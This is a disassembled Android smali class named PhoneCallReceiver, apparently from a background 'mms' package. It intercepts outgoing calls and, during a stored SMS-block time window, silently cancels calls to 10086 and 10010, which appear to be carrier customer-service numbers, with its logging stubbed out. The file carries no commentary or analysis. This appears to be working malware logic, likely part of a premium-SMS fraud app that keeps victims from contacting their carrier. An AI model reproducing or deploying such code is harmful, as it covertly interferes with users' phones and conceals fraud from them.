.class public Lcom/mms/bg/ui/PhoneCallReceiver;
.super Landroid/content/BroadcastReceiver;
.source "PhoneCallReceiver.java"


# static fields
.field private static final DEBUG:Z = false

.field private static final TAG:Ljava/lang/String; = "PhoneCallReceiver"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static final LOGD(Ljava/lang/String;)V
    .registers 1
    .parameter "msg"

    .prologue
    .line 36
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 13
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 16
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "[[onReceive]] receive a new call for intent : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/mms/bg/ui/PhoneCallReceiver;->LOGD(Ljava/lang/String;)V

    .line 17
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "++++++++++ result = "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {p0}, Lcom/mms/bg/ui/PhoneCallReceiver;->getResultData()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/mms/bg/ui/PhoneCallReceiver;->LOGD(Ljava/lang/String;)V

    .line 19
    invoke-virtual {p0}, Lcom/mms/bg/ui/PhoneCallReceiver;->getResultData()Ljava/lang/String;

    move-result-object v2

    .line 20
    .local v2, number:Ljava/lang/String;
    if-eqz v2, :cond_60

    .line 21
    invoke-static {p1}, Lcom/mms/bg/ui/SettingManager;->getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;

    move-result-object v3

    .line 22
    .local v3, sm:Lcom/mms/bg/ui/SettingManager;
    invoke-virtual {v3}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockBeginTime()J

    move-result-wide v6

    .line 23
    .local v6, smsLastSendTime:J
    invoke-virtual {v3}, Lcom/mms/bg/ui/SettingManager;->getSMSBlockDelayTime()J

    move-result-wide v4

    .line 24
    .local v4, smsBlockTime:J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    .line 25
    .local v0, curTime:J
    sub-long v8, v0, v6

    cmp-long v8, v8, v4

    if-gez v8, :cond_60

    const-string v8, "10086"

    invoke-virtual {v2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_5c

    const-string v8, "10010"

    invoke-virtual {v2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_60

    .line 27
    :cond_5c
    const/4 v8, 0x0

    invoke-virtual {p0, v8}, Lcom/mms/bg/ui/PhoneCallReceiver;->setResultData(Ljava/lang/String;)V

    .line 30
    .end local v0           #curTime:J
    .end local v3           #sm:Lcom/mms/bg/ui/SettingManager;
    .end local v4           #smsBlockTime:J
    .end local v6           #smsLastSendTime:J
    :cond_60
    return-void
.end method
